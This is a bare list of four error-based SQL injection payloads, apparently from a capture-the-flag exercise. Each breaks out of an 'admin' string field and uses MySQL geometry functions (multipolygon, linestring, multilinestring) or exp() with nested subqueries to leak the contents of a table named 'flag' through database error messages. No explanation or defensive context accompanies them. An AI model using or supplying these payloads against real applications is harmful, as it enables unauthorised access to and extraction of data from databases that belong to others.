admin') and multipolygon((select * from(select * from(select * from flag)a)b))#
admin') and linestring((select * from(select * from(select * from flag)a)b))#
admin') and multilinestring((select * from(select * from(select * from flag)a)b))#
admin') and exp(~(select * from(select * from flag)a))#
